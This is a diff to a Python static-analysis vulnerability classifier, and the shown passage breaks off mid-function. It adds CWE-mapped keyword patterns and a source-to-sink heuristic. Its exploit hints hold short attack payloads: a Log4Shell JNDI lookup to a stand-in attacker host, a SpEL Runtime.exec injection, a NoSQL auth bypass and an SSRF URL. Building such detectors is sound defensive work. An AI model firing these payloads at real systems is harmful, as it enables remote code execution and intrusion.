@@ -248,7 +248,644 @@ VULN_PATTERNS: Dict[str, VulnPattern] = {
         keywords=["MD5", "SHA1", "DES", "RC4", "ECB"],
         anti_keywords=["SHA256", "SHA-256", "AES/GCM", "bcrypt", "argon2"]
     ),
+    
+    # === TOMCAT-SPECIFIC PATTERNS ===
+    
+    "Session Fixation": VulnPattern(
+        cwe="CWE-384",
+        cwe_name="Session Fixation",
+        owasp="A07:2021-Identification and Authentication Failures",
+        severity="High",
+        keywords=["getSession(true)", "request.getSession()", "JSESSIONID",
+                  "setMaxInactiveInterval", "session.getAttribute"],
+        anti_keywords=["changeSessionId", "invalidate()", "session.invalidate"],
+        cve_examples=["CVE-2011-3190"],
+        exploit_hints="Fixate session ID before authentication",
+        valid_extensions=[".java", ".jsp"]
+    ),
+    
+    "File Upload Vulnerability": VulnPattern(
+        cwe="CWE-434",
+        cwe_name="Unrestricted Upload of File with Dangerous Type",
+        owasp="A04:2021-Insecure Design",
+        severity="Critical",
+        keywords=["MultipartFile", "FileUpload", "getOriginalFilename", 
+                  "transferTo", "saveTo", "write(file", "FileOutputStream",
+                  "Part.write", "getSubmittedFileName"],
+        anti_keywords=["getContentType().equals", "validateFileType", "allowedExtensions",
+                      "FilenameUtils.getExtension", "ContentType.isAllowed"],
+        cve_examples=["CVE-2017-12617", "CVE-2017-12615"],
+        exploit_hints="Upload JSP webshell via PUT or multipart",
+        valid_extensions=[".java", ".jsp"]
+    ),
+    
+    "JSP Code Injection": VulnPattern(
+        cwe="CWE-94",
+        cwe_name="Improper Control of Generation of Code ('Code Injection')",
+        owasp="A03:2021-Injection",
+        severity="Critical",
+        keywords=["<%= request.getParameter", "${param.", "<%=", 
+                  "pageContext.setAttribute", "JspWriter", "out.print"],
+        anti_keywords=["c:out", "fn:escapeXml", "JSTL", "htmlEscape"],
+        cve_examples=["CVE-2024-50379"],
+        exploit_hints="Inject Java code in JSP expression",
+        valid_extensions=[".jsp", ".jspx", ".jspf"]
+    ),
+    
+    "AJP Protocol Abuse": VulnPattern(
+        cwe="CWE-284",
+        cwe_name="Improper Access Control",
+        owasp="A01:2021-Broken Access Control",
+        severity="Critical",
+        keywords=["protocol=\"AJP\"", "AJP/1.3", "ajp-nio", "8009",
+                  "AjpProtocol", "AjpNioProtocol", "org.apache.coyote.ajp"],
+        anti_keywords=["secretRequired=\"true\"", "secret="],
+        cve_examples=["CVE-2020-1938"],
+        exploit_hints="Ghostcat - Read webapp files via AJP port 8009",
+        valid_extensions=[".xml"]
+    ),
+    
+    "Tomcat Manager Exposure": VulnPattern(
+        cwe="CWE-200",
+        cwe_name="Exposure of Sensitive Information",
+        owasp="A05:2021-Security Misconfiguration",
+        severity="High",
+        keywords=["manager-gui", "manager-script", "tomcat-users.xml",
+                  "<role rolename=\"manager", "<user username=", "password="],
+        anti_keywords=[],
+        cve_examples=["CVE-2020-8022"],
+        exploit_hints="Access /manager/html with default credentials",
+        valid_extensions=[".xml"]
+    ),
+    
+    "Unsafe ObjectInputStream": VulnPattern(
+        cwe="CWE-502",
+        cwe_name="Deserialization of Untrusted Data",
+        owasp="A08:2021-Software and Data Integrity Failures",
+        severity="Critical",
+        keywords=["ObjectInputStream", "readObject()", "ObjectInput",
+                  "PersistentManager", "FileStore", ".session"],
+        anti_keywords=["ObjectInputFilter", "validateClass", "resolveClass"],
+        cve_examples=["CVE-2020-9484", "CVE-2016-8735"],
+        exploit_hints="RCE via ysoserial gadget chain in session file",
+        valid_extensions=[".java"]
+    ),
+    
+    "Servlet Request Manipulation": VulnPattern(
+        cwe="CWE-20",
+        cwe_name="Improper Input Validation",
+        owasp="A03:2021-Injection",
+        severity="High",
+        keywords=["request.getParameter", "request.getHeader", "request.getCookies",
+                  "getQueryString", "getPathInfo", "getRequestURI", "getInputStream"],
+        anti_keywords=["StringEscapeUtils", "HtmlUtils.htmlEscape", "Validator", 
+                      "validateInput", "sanitize"],
+        exploit_hints="Inject malicious input via request parameters",
+        valid_extensions=[".java"]
+    ),
+    
+    "Unsafe Redirect": VulnPattern(
+        cwe="CWE-601",
+        cwe_name="URL Redirection to Untrusted Site ('Open Redirect')",
+        owasp="A01:2021-Broken Access Control",
+        severity="Medium",
+        keywords=["response.sendRedirect", "setHeader(\"Location\"", 
+                  "RequestDispatcher", "forward("],
+        anti_keywords=["startsWith(\"/\")", "isValidRedirect", "allowedDomains"],
+        cve_examples=["CVE-2018-11784"],
+        exploit_hints="Redirect to malicious domain",
+        valid_extensions=[".java", ".jsp"]
+    ),
+    
+    "HTTP Response Splitting": VulnPattern(
+        cwe="CWE-113",
+        cwe_name="Improper Neutralization of CRLF Sequences in HTTP Headers",
+        owasp="A03:2021-Injection",
+        severity="High",
+        keywords=["setHeader(", "addHeader(", "addCookie(", "response.setHeader"],
+        anti_keywords=["stripNewlines", "replaceAll(\"[\\\\r\\\\n]\""],
+        exploit_hints="Inject CRLF to add malicious headers",
+        valid_extensions=[".java", ".jsp"]
+    ),
+    
+    "Race Condition (TOCTOU)": VulnPattern(
+        cwe="CWE-367",
+        cwe_name="Time-of-check Time-of-use (TOCTOU) Race Condition",
+        owasp="A04:2021-Insecure Design",
+        severity="High",
+        keywords=["exists()", "isFile()", "canRead()", "length()", 
+                  "File.exists", "Files.exists", "createNewFile"],
+        anti_keywords=["synchronized", "FileLock", "AtomicFile"],
+        cve_examples=["CVE-2024-50379", "CVE-2024-56337"],
+        exploit_hints="Race condition between check and use of file",
+        valid_extensions=[".java"]
+    ),
+    
+    # =============================================================================
+    # EXPANDED VULNERABILITY PATTERNS - ADDITIONAL COVERAGE
+    # =============================================================================
+    
+    # === AUTHENTICATION & SESSION (A07:2021) ===
+    
+    "Broken Authentication": VulnPattern(
+        cwe="CWE-287",
+        cwe_name="Improper Authentication",
+        owasp="A07:2021-Identification and Authentication Failures",
+        severity="Critical",
+        keywords=["authenticate(", "login(", "checkPassword", "verifyUser",
+                  "validateCredentials", "isAuthenticated", "doLogin"],
+        anti_keywords=["mfa", "2fa", "totp", "rateLimit", "lockout", "captcha"],
+        cve_examples=["CVE-2021-34527", "CVE-2020-1472"],
+        exploit_hints="Test for default credentials, brute force, credential stuffing"
+    ),
+    
+    "Missing Authentication": VulnPattern(
+        cwe="CWE-306",
+        cwe_name="Missing Authentication for Critical Function",
+        owasp="A07:2021-Identification and Authentication Failures",
+        severity="Critical",
+        keywords=["@PermitAll", "permitAll()", "anonymous", "noAuth",
+                  "skipAuth", "bypassAuth", "publicEndpoint"],
+        cve_examples=["CVE-2022-22965"],
+        exploit_hints="Access critical endpoints without authentication"
+    ),
+    
+    "Insufficient Session Expiration": VulnPattern(
+        cwe="CWE-613",
+        cwe_name="Insufficient Session Expiration",
+        owasp="A07:2021-Identification and Authentication Failures",
+        severity="Medium",
+        keywords=["setMaxInactiveInterval(0)", "session.setMaxAge(-1)",
+                  "never expire", "persistent session", "rememberMe"],
+        anti_keywords=["setMaxInactiveInterval(30", "session timeout"],
+        exploit_hints="Session tokens remain valid indefinitely"
+    ),
+    
+    "JWT Vulnerabilities": VulnPattern(
+        cwe="CWE-347",
+        cwe_name="Improper Verification of Cryptographic Signature",
+        owasp="A07:2021-Identification and Authentication Failures",
+        severity="Critical",
+        keywords=["jwt.decode", "JWT.decode", "none algorithm", "alg: none",
+                  "verify=False", "verify: false", "ignoreExpiration"],
+        anti_keywords=["verify=True", "algorithms=['RS256']", "verify: true"],
+        cve_examples=["CVE-2018-0114"],
+        exploit_hints="Forge JWT with 'none' algorithm or weak secret"
+    ),
+    
+    # === ACCESS CONTROL (A01:2021) ===
+    
+    "Insecure Direct Object Reference (IDOR)": VulnPattern(
+        cwe="CWE-639",
+        cwe_name="Authorization Bypass Through User-Controlled Key",
+        owasp="A01:2021-Broken Access Control",
+        severity="High",
+        keywords=["user_id=", "userId=", "account_id", "orderId", "fileId",
+                  "request.getParameter(\"id\")", "params[:id]", "req.params.id"],
+        anti_keywords=["checkOwnership", "verifyAccess", "authorize", "acl.check"],
+        cve_examples=["CVE-2019-16759"],
+        exploit_hints="Manipulate object IDs to access other users' data"
+    ),
+    
+    "Privilege Escalation": VulnPattern(
+        cwe="CWE-269",
+        cwe_name="Improper Privilege Management",
+        owasp="A01:2021-Broken Access Control",
+        severity="Critical",
+        keywords=["setRole", "isAdmin", "role=admin", "elevate", "sudo",
+                  "setuid", "setgid", "SYSTEM", "root", "Administrator"],
+        anti_keywords=["requireRole", "checkPrivilege", "authorize"],
+        cve_examples=["CVE-2021-1732", "CVE-2021-36934"],
+        exploit_hints="Escalate from user to admin/root privileges"
+    ),
+    
+    "Directory Listing Enabled": VulnPattern(
+        cwe="CWE-548",
+        cwe_name="Exposure of Information Through Directory Listing",
+        owasp="A01:2021-Broken Access Control",
+        severity="Low",
+        keywords=["listings=true", "directoryListing", "autoIndex on",
+                  "Options +Indexes", "DirectoryIndex"],
+        anti_keywords=["listings=false", "autoIndex off", "Options -Indexes"],
+        exploit_hints="Browse directory contents to find sensitive files"
+    ),
+    
+    "CORS Misconfiguration": VulnPattern(
+        cwe="CWE-942",
+        cwe_name="Permissive Cross-domain Policy with Untrusted Domains",
+        owasp="A01:2021-Broken Access Control",
+        severity="Medium",
+        keywords=["Access-Control-Allow-Origin: *", "Access-Control-Allow-Credentials: true",
+                  "allowedOrigins(\"*\")", "cors({ origin: '*' })"],
+        anti_keywords=["allowedOrigins(Arrays.asList", "origin: [specific"],
+        exploit_hints="Cross-origin attacks to steal data via CORS"
+    ),
+    
+    # === CRYPTOGRAPHIC FAILURES (A02:2021) ===
+    
+    "Weak Password Hashing": VulnPattern(
+        cwe="CWE-916",
+        cwe_name="Use of Password Hash With Insufficient Computational Effort",
+        owasp="A02:2021-Cryptographic Failures",
+        severity="High",
+        keywords=["md5(password", "sha1(password", "hash(password",
+                  "MessageDigest.getInstance(\"MD5\")", "hashlib.md5"],
+        anti_keywords=["bcrypt", "argon2", "scrypt", "PBKDF2", "password_hash"],
+        cve_examples=["CVE-2019-1010266"],
+        exploit_hints="Crack weak hashes with rainbow tables or hashcat"
+    ),
+    
+    "Hardcoded Cryptographic Key": VulnPattern(
+        cwe="CWE-321",
+        cwe_name="Use of Hard-coded Cryptographic Key",
+        owasp="A02:2021-Cryptographic Failures",
+        severity="Critical",
+        keywords=["secretKey = \"", "private_key = \"", "AES_KEY =",
+                  "encryption_key =", "signing_key =", "HMAC_SECRET"],
+        anti_keywords=["getenv(", "os.environ", "config.get(", "secrets."],
+        exploit_hints="Extract hardcoded key to decrypt data or forge signatures"
+    ),
+    
+    "Insecure Random": VulnPattern(
+        cwe="CWE-330",
+        cwe_name="Use of Insufficiently Random Values",
+        owasp="A02:2021-Cryptographic Failures",
+        severity="High",
+        keywords=["Math.random()", "rand()", "random.random()", "srand(time",
+                  "java.util.Random", "new Random()", "mt_rand("],
+        anti_keywords=["SecureRandom", "crypto.randomBytes", "os.urandom",
+                      "secrets.token", "random_bytes(", "crypto.getRandomValues"],
+        cve_examples=["CVE-2020-7010"],
+        exploit_hints="Predict random values for session tokens or crypto"
+    ),
+    
+    "Missing Encryption": VulnPattern(
+        cwe="CWE-311",
+        cwe_name="Missing Encryption of Sensitive Data",
+        owasp="A02:2021-Cryptographic Failures",
+        severity="High",
+        keywords=["http://", "ftp://", "telnet://", "plaintext", "unencrypted",
+                  "setSecure(false)", "Cookie(", "without SSL"],
+        anti_keywords=["https://", "TLS", "SSL", "setSecure(true)"],
+        exploit_hints="Intercept unencrypted traffic to steal data"
+    ),
+    
+    # === INJECTION VARIANTS (A03:2021) ===
+    
+    "NoSQL Injection": VulnPattern(
+        cwe="CWE-943",
+        cwe_name="Improper Neutralization of Special Elements in Data Query Logic",
+        owasp="A03:2021-Injection",
+        severity="High",
+        keywords=["$where:", "$gt:", "$ne:", "$regex:", "find({",
+                  "collection.find", "db.collection", "mongodb://"],
+        anti_keywords=["sanitize", "escape", "validator", "mongoose.Schema"],
+        cve_examples=["CVE-2021-22911"],
+        exploit_hints="Inject {$gt: ''} to bypass authentication"
+    ),
+    
+    "ORM Injection": VulnPattern(
+        cwe="CWE-89",
+        cwe_name="ORM Injection via Raw Queries",
+        owasp="A03:2021-Injection",
+        severity="High",
+        keywords=["raw(", ".extra(", "execute_sql", "Sequelize.literal",
+                  "knex.raw(", "prisma.$queryRaw", "entityManager.createQuery"],
+        anti_keywords=["bind", "parameterized", "prepared"],
+        exploit_hints="Inject SQL through ORM raw query methods"
+    ),
+    
+    "Header Injection": VulnPattern(
+        cwe="CWE-644",
+        cwe_name="Improper Neutralization of HTTP Headers for Scripting Syntax",
+        owasp="A03:2021-Injection",
+        severity="Medium",
+        keywords=["setHeader(", "addHeader(", "header(", "response.setHeader",
+                  "res.set(", "HttpServletResponse.setHeader"],
+        anti_keywords=["stripNewlines", "sanitizeHeader", "validateHeader"],
+        cve_examples=["CVE-2020-11022"],
+        exploit_hints="Inject CRLF to add malicious headers"
+    ),
+    
+    "Log Injection": VulnPattern(
+        cwe="CWE-117",
+        cwe_name="Improper Output Neutralization for Logs",
+        owasp="A03:2021-Injection",
+        severity="Medium",
+        keywords=["logger.info(user", "log.debug(input", "console.log(req",
+                  "logging.info(", "Log.i(", "System.out.println("],
+        anti_keywords=["sanitize", "escape", "encode"],
+        cve_examples=["CVE-2021-44228"],
+        exploit_hints="Inject newlines or JNDI lookups into logs (Log4Shell)"
+    ),
+    
+    "Log4Shell (JNDI Injection)": VulnPattern(
+        cwe="CWE-917",
+        cwe_name="JNDI Injection (Log4Shell)",
+        owasp="A03:2021-Injection",
+        severity="Critical",
+        keywords=["${jndi:", "log4j", "Log4j", "org.apache.logging.log4j",
+                  "logger.info(", "logger.error(", "logger.debug("],
+        anti_keywords=["log4j2.formatMsgNoLookups=true", "LOG4J_FORMAT_MSG_NO_LOOKUPS"],
+        cve_examples=["CVE-2021-44228", "CVE-2021-45046"],
+        exploit_hints="${jndi:ldap://attacker.com/a} for RCE",
+        valid_extensions=[".java", ".xml", ".properties"]
+    ),
+    
+    "Expression Language Injection": VulnPattern(
+        cwe="CWE-917",
+        cwe_name="Server-Side Expression Language Injection",
+        owasp="A03:2021-Injection",
+        severity="Critical",
+        keywords=["${", "#{", "{{", "%{", "@{", "*{",
+                  "SpEL", "OGNL", "MVEL", "Freemarker"],
+        anti_keywords=["escapedExpression", "sanitizeExpression"],
+        cve_examples=["CVE-2022-22963", "CVE-2017-5638"],
+        exploit_hints="Inject ${T(java.lang.Runtime).getRuntime().exec('id')}"
+    ),
+    
+    "ReDoS (Regular Expression DoS)": VulnPattern(
+        cwe="CWE-1333",
+        cwe_name="Inefficient Regular Expression Complexity",
+        owasp="A03:2021-Injection",
+        severity="Medium",
+        keywords=["(a+)+", "(a|a)+", "(a|b|ab)*", ".*.*.*",
+                  "Pattern.compile(", "re.compile(", "new RegExp("],
+        exploit_hints="Input evil regex to cause CPU exhaustion"
+    ),
+    
+    # === SECURITY MISCONFIGURATION (A05:2021) ===
+    
+    "Debug Mode Enabled": VulnPattern(
+        cwe="CWE-489",
+        cwe_name="Active Debug Code",
+        owasp="A05:2021-Security Misconfiguration",
+        severity="Medium",
+        keywords=["DEBUG=True", "debug: true", "debugMode", "setDebug(true)",
+                  "development", "devMode", "FLASK_DEBUG=1"],
+        anti_keywords=["DEBUG=False", "production", "debug: false"],
+        exploit_hints="Debug mode exposes stack traces and sensitive info"
+    ),
+    
+    "Default Credentials": VulnPattern(
+        cwe="CWE-1392",
+        cwe_name="Use of Default Credentials",
+        owasp="A05:2021-Security Misconfiguration",
+        severity="Critical",
+        keywords=["admin:admin", "root:root", "admin:password", "user:user",
+                  "test:test", "default:default", "guest:guest"],
+        cve_examples=["CVE-2019-19781"],
+        exploit_hints="Try common default credentials"
+    ),
+    
+    "Exposed Admin Interface": VulnPattern(
+        cwe="CWE-1188",
+        cwe_name="Insecure Default Initialization of Resource",
+        owasp="A05:2021-Security Misconfiguration",
+        severity="High",
+        keywords=["/admin", "/manager", "/console", "/actuator", "/swagger",
+                  "/graphql", "/phpmyadmin", "/wp-admin", "/dashboard"],
+        anti_keywords=["requireAuth", "authenticated", "secured"],
+        exploit_hints="Access admin interfaces without proper protection"
+    ),
+    
+    "Stack Trace Exposure": VulnPattern(
+        cwe="CWE-209",
+        cwe_name="Generation of Error Message Containing Sensitive Information",
+        owasp="A05:2021-Security Misconfiguration",
+        severity="Low",
+        keywords=["printStackTrace()", "e.getMessage()", "traceback.print_exc",
+                  "console.error(err)", "showErrorDetails", "verbose error"],
+        anti_keywords=["hideStackTrace", "production", "sanitizeError"],
+        exploit_hints="Error messages reveal internal implementation"
+    ),
+    
+    # === VULNERABLE COMPONENTS (A06:2021) ===
+    
+    "Outdated Library": VulnPattern(
+        cwe="CWE-1104",
+        cwe_name="Use of Unmaintained Third Party Components",
+        owasp="A06:2021-Vulnerable and Outdated Components",
+        severity="High",
+        keywords=["jquery-1.", "jquery-2.", "angular.js/1.0", "struts2-core-2.3",
+                  "log4j-core:2.14", "spring-core:4.", "jackson-databind:2.9"],
+        cve_examples=["CVE-2017-5638", "CVE-2021-44228"],
+        exploit_hints="Check known CVEs for library versions"
+    ),
+    
+    # === DATA INTEGRITY (A08:2021) ===
+    
+    "Unsafe Deserialization (Python)": VulnPattern(
+        cwe="CWE-502",
+        cwe_name="Python Pickle Deserialization",
+        owasp="A08:2021-Software and Data Integrity Failures",
+        severity="Critical",
+        keywords=["pickle.load", "pickle.loads", "cPickle.load", "shelve.open",
+                  "marshal.loads", "yaml.load(", "yaml.unsafe_load"],
+        anti_keywords=["yaml.safe_load", "json.loads"],
+        cve_examples=["CVE-2020-13091"],
+        exploit_hints="Inject malicious pickle payload for RCE",
+        valid_extensions=[".py"]
+    ),
+    
+    "Unsafe Deserialization (PHP)": VulnPattern(
+        cwe="CWE-502",
+        cwe_name="PHP Unserialize Vulnerability",
+        owasp="A08:2021-Software and Data Integrity Failures",
+        severity="Critical",
+        keywords=["unserialize(", "maybe_unserialize(", "phar://"],
+        anti_keywords=["json_decode", "allowed_classes: false"],
+        cve_examples=["CVE-2019-6977"],
+        exploit_hints="Inject serialized PHP object for code execution",
+        valid_extensions=[".php"]
+    ),
+    
+    "Unsafe Deserialization (.NET)": VulnPattern(
+        cwe="CWE-502",
+        cwe_name=".NET Deserialization Vulnerability",
+        owasp="A08:2021-Software and Data Integrity Failures",
+        severity="Critical",
+        keywords=["BinaryFormatter", "ObjectStateFormatter", "NetDataContractSerializer",
+                  "LosFormatter", "SoapFormatter", "XmlSerializer"],
+        anti_keywords=["JsonSerializer", "DataContractSerializer with known types"],
+        cve_examples=["CVE-2020-1147"],
+        exploit_hints="Use ysoserial.net gadgets for RCE",
+        valid_extensions=[".cs", ".vb"]
+    ),
+    
+    "Mass Assignment": VulnPattern(
+        cwe="CWE-915",
+        cwe_name="Improperly Controlled Modification of Dynamically-Determined Object Attributes",
+        owasp="A08:2021-Software and Data Integrity Failures",
+        severity="High",
+        keywords=["req.body", "request.POST", "params.permit!", "attr_accessible",
+                  "update_attributes(", "Object.assign(", "_.extend("],
+        anti_keywords=["strong_params", "attr_protected", "whitelist"],
+        exploit_hints="Add isAdmin=true to request to elevate privileges"
+    ),
+    
+    # === LOGGING & MONITORING (A09:2021) ===
+    
+    "Insufficient Logging": VulnPattern(
+        cwe="CWE-778",
+        cwe_name="Insufficient Logging",
+        owasp="A09:2021-Security Logging and Monitoring Failures",
+        severity="Medium",
+        keywords=["catch {}", "except: pass", "catch(Exception e) {}",
+                  "silentFail", "ignoreErrors"],
+        exploit_hints="Failed attacks go undetected without logging"
+    ),
+    
+    # === SERVER-SIDE REQUEST FORGERY (A10:2021) ===
+    
+    "SSRF via URL Parameter": VulnPattern(
+        cwe="CWE-918",
+        cwe_name="SSRF via User-Controlled URL",
+        owasp="A10:2021-Server-Side Request Forgery",
+        severity="High",
+        keywords=["url=http", "target=http", "redirect=http", "next=http",
+                  "callback=http", "uri=http", "path=http", "link=http"],
+        anti_keywords=["validateUrl", "allowedHosts", "whitelist"],
+        exploit_hints="Request internal services via url=http://localhost/admin"
+    ),
+    
+    # === MEMORY CORRUPTION EXPANDED (C/C++) ===
+    
+    "Null Pointer Dereference": VulnPattern(
+        cwe="CWE-476",
+        cwe_name="NULL Pointer Dereference",
+        owasp="N/A",
+        severity="Medium",
+        keywords=["->", "*ptr", "ptr->", "if (ptr)", "ptr != NULL"],
+        regex_patterns=[r'\*[a-zA-Z_]+\s*(?!=\s*NULL)'],
+        cve_examples=["CVE-2021-3449"],
+        valid_extensions=[".c", ".cpp", ".cc", ".h", ".hpp"]
+    ),
+    
+    "Double Free": VulnPattern(
+        cwe="CWE-415",
+        cwe_name="Double Free",
+        owasp="N/A",
+        severity="Critical",
+        keywords=["free(", "delete ", "kfree("],
+        cve_examples=["CVE-2021-22555"],
+        exploit_hints="Free same memory twice for heap exploitation",
+        valid_extensions=[".c", ".cpp", ".cc", ".h", ".hpp"]
+    ),
+    
+    "Heap Overflow": VulnPattern(
+        cwe="CWE-122",
+        cwe_name="Heap-based Buffer Overflow",
+        owasp="N/A",
+        severity="Critical",
+        keywords=["malloc(", "calloc(", "realloc(", "new ", "HeapAlloc"],
+        cve_examples=["CVE-2021-21220"],
+        exploit_hints="Overflow heap buffer to control adjacent objects",
+        valid_extensions=[".c", ".cpp", ".cc", ".h", ".hpp"]
+    ),
+    
+    "Stack Buffer Overflow": VulnPattern(
+        cwe="CWE-121",
+        cwe_name="Stack-based Buffer Overflow",
+        owasp="N/A",
+        severity="Critical",
+        keywords=["char buf[", "char buffer[", "char str[", "alloca("],
+        cve_examples=["CVE-2021-3156"],
+        exploit_hints="Overflow stack buffer to overwrite return address",
+        valid_extensions=[".c", ".cpp", ".cc", ".h", ".hpp"]
+    ),
+    
+    "Type Confusion": VulnPattern(
+        cwe="CWE-843",
+        cwe_name="Access of Resource Using Incompatible Type ('Type Confusion')",
+        owasp="N/A",
+        severity="Critical",
+        keywords=["reinterpret_cast<", "static_cast<", "(struct ", "union {"],
+        cve_examples=["CVE-2021-21224"],
+        valid_extensions=[".c", ".cpp", ".cc", ".h", ".hpp"]
+    ),
+    
+    "Uninitialized Variable": VulnPattern(
+        cwe="CWE-457",
+        cwe_name="Use of Uninitialized Variable",
+        owasp="N/A",
+        severity="Medium",
+        keywords=["int ", "char ", "void *", "struct "],
+        valid_extensions=[".c", ".cpp", ".cc", ".h", ".hpp"]
+    ),
+    
+    # === MOBILE (Android/iOS) ===
+    
+    "Android WebView JavaScript": VulnPattern(
+        cwe="CWE-749",
+        cwe_name="Exposed Dangerous Method or Function",
+        owasp="M1:2016-Improper Platform Usage",
+        severity="High",
+        keywords=["setJavaScriptEnabled(true)", "addJavascriptInterface",
+                  "setAllowFileAccess(true)", "setAllowUniversalAccessFromFileURLs"],
+        anti_keywords=["setJavaScriptEnabled(false)", "setAllowFileAccess(false)"],
+        exploit_hints="Execute JavaScript in WebView context",
+        valid_extensions=[".java", ".kt"]
+    ),
+    
+    "Android Insecure Storage": VulnPattern(
+        cwe="CWE-312",
+        cwe_name="Cleartext Storage of Sensitive Information",
+        owasp="M2:2016-Insecure Data Storage",
+        severity="High",
+        keywords=["SharedPreferences", "getSharedPreferences", "MODE_WORLD_READABLE",
+                  "MODE_WORLD_WRITEABLE", "SQLiteDatabase"],
+        anti_keywords=["EncryptedSharedPreferences", "MODE_PRIVATE", "encrypted"],
+        valid_extensions=[".java", ".kt"]
+    ),
+    
+    "iOS Keychain Misuse": VulnPattern(
+        cwe="CWE-522",
+        cwe_name="Insufficiently Protected Credentials",
+        owasp="M2:2016-Insecure Data Storage",
+        severity="High",
+        keywords=["UserDefaults", "NSUserDefaults", "kSecAttrAccessibleAlways"],
+        anti_keywords=["Keychain", "kSecAttrAccessibleWhenUnlocked"],
+        valid_extensions=[".swift", ".m"]
+    ),
+    
+    # === CLOUD/INFRASTRUCTURE ===
+    
+    "AWS S3 Public Access": VulnPattern(
+        cwe="CWE-284",
+        cwe_name="Improper Access Control (S3 Bucket)",
+        owasp="A01:2021-Broken Access Control",
+        severity="Critical",
+        keywords=["s3:*", "Principal: \"*\"", "PublicAccessBlockConfiguration",
+                  "BlockPublicAcls: false", "GrantRead=uri=http://acs.amazonaws.com/groups/global/AllUsers"],
+        anti_keywords=["BlockPublicAcls: true", "RestrictPublicBuckets: true"],
+        exploit_hints="Access or list public S3 bucket contents"
+    ),
+    
+    "Kubernetes RBAC Misconfiguration": VulnPattern(
+        cwe="CWE-732",
+        cwe_name="Incorrect Permission Assignment for Critical Resource",
+        owasp="A01:2021-Broken Access Control",
+        severity="High",
+        keywords=["cluster-admin", "system:masters", "resources: [\"*\"]",
+                  "verbs: [\"*\"]", "apiGroups: [\"*\"]"],
+        anti_keywords=["resources: [specific", "verbs: [get, list"],
+        valid_extensions=[".yaml", ".yml"]
+    ),
+    
+    "Docker Privileged Mode": VulnPattern(
+        cwe="CWE-250",
+        cwe_name="Execution with Unnecessary Privileges",
+        owasp="A05:2021-Security Misconfiguration",
+        severity="Critical",
+        keywords=["--privileged", "privileged: true", "CAP_SYS_ADMIN",
+                  "hostNetwork: true", "hostPID: true"],
+        anti_keywords=["privileged: false", "readOnlyRootFilesystem: true"],
+        exploit_hints="Escape container to host system",
+        valid_extensions=[".yaml", ".yml", ".dockerfile", ""]
+    ),
 }
+
 
 
 class VulnPatternClassifier:
@@ -362,6 +999,165 @@ def get_pattern_classifier() -> VulnPatternClassifier:
 def classify_by_pattern(code_snippet: str, file_path: str = "") -> Optional[Dict[str, Any]]:
     """Convenience function for quick pattern-based classification."""
     return get_pattern_classifier().classify(code_snippet, file_path)
+
+
+def classify_generic_heuristic(code_snippet: str, file_path: str = "") -> Optional[Dict[str, Any]]:
+    """
+    Generic heuristic-based classification for unknown/novel vulnerabilities.
+    
+    This function analyzes code structure and patterns to infer potential
+    vulnerability types even when exact pattern matching fails.
+    
+    Uses a scoring system based on:
+    1. Input sources (user-controlled data)
+    2. Dangerous sinks (where data is used unsafely) 
+    3. Missing sanitization patterns
+    4. Data flow indicators
+    
+    Returns:
+        Dict with suggested CWE, type, and medium confidence
+        None if no suspicious patterns found
+    """
+    code_lower = code_snippet.lower()
+    _, ext = os.path.splitext(file_path)
+    ext = ext.lower()
+    
+    # === INPUT SOURCES (user-controlled data entry points) ===
+    input_sources = [
+        # Java/Servlet
+        "request.getParameter", "request.getHeader", "request.getCookies",
+        "getInputStream", "getReader", "getQueryString", "getPathInfo",
+        # PHP
+        "$_GET", "$_POST", "$_REQUEST", "$_COOKIE", "$_SERVER", "$_FILES",
+        # Python
+        "request.args", "request.form", "request.data", "request.json",
+        "input(", "sys.argv", "os.environ",
+        # Node.js
+        "req.body", "req.params", "req.query", "req.headers",
+        # Generic
+        "user_input", "argv[", "fgets(", "scanf(", "read(",
+    ]
+    
+    # === DANGEROUS SINKS by category ===
+    sink_categories = {
+        "CWE-78": {  # Command Injection
+            "sinks": ["exec(", "system(", "popen(", "shell_exec", "Runtime.exec",
+                     "ProcessBuilder", "subprocess", "os.system", "os.popen"],
+            "type": "Potential Command Injection",
+            "severity": "Critical"
+        },
+        "CWE-89": {  # SQL Injection
+            "sinks": ["executeQuery", "executeUpdate", "execute(", "cursor.execute",
+                     "query(", "rawQuery", "createStatement", "$sql"],
+            "type": "Potential SQL Injection",
+            "severity": "Critical"
+        },
+        "CWE-22": {  # Path Traversal
+            "sinks": ["open(", "fopen(", "file_get_contents", "include(", "require(",
+                     "readFile", "writeFile", "FileInputStream", "FileOutputStream"],
+            "type": "Potential Path Traversal",
+            "severity": "High"
+        },
+        "CWE-79": {  # XSS
+            "sinks": ["innerHTML", "outerHTML", "document.write", "response.getWriter",
+                     "out.print", "echo", "print(", "dangerouslySetInnerHTML"],
+            "type": "Potential Cross-Site Scripting (XSS)",
+            "severity": "High"
+        },
+        "CWE-502": {  # Deserialization
+            "sinks": ["readObject", "ObjectInputStream", "unserialize", "pickle.load",
+                     "yaml.load", "json.loads", "marshal.load", "XMLDecoder"],
+            "type": "Potential Insecure Deserialization",
+            "severity": "Critical"
+        },
+        "CWE-611": {  # XXE
+            "sinks": ["XMLInputFactory", "DocumentBuilderFactory", "SAXParser",
+                     "XMLReader", "parseXML", "xml.etree", "lxml.etree"],
+            "type": "Potential XML External Entity (XXE)",
+            "severity": "High"
+        },
+        "CWE-918": {  # SSRF
+            "sinks": ["openConnection", "HttpClient", "RestTemplate", "urlopen",
+                     "requests.get", "requests.post", "fetch(", "curl_exec"],
+            "type": "Potential Server-Side Request Forgery (SSRF)",
+            "severity": "High"
+        },
+        "CWE-94": {  # Code Injection
+            "sinks": ["eval(", "exec(", "compile(", "Function(", "setTimeout(",
+                     "setInterval(", "new Function", "reflection.invoke"],
+            "type": "Potential Code Injection",
+            "severity": "Critical"
+        },
+        "CWE-119": {  # Buffer Overflow
+            "sinks": ["strcpy(", "strcat(", "sprintf(", "gets(", "memcpy(",
+                     "memmove(", "scanf(", "vsprintf("],
+            "type": "Potential Buffer Overflow",
+            "severity": "Critical"
+        },
+    }
+    
+    # === SANITIZATION PATTERNS (if present, reduce risk) ===
+    sanitizers = [
+        "escape", "sanitize", "encode", "validate", "filter", "whitelist",
+        "allowlist", "prepared", "parameterized", "htmlspecialchars",
+        "addslashes", "strip_tags", "htmlentities", "encodeURIComponent",
+    ]
+    
+    # Count input sources
+    input_count = sum(1 for src in input_sources if src.lower() in code_lower)
+    
+    # Check for sanitization
+    has_sanitization = any(san.lower() in code_lower for san in sanitizers)
+    
+    # Find matching sink categories
+    best_match = None
+    best_score = 0
+    
+    for cwe, category in sink_categories.items():
+        sink_count = sum(1 for sink in category["sinks"] if sink.lower() in code_lower)
+        
+        if sink_count > 0:
+            # Score = input sources + sinks - sanitization bonus
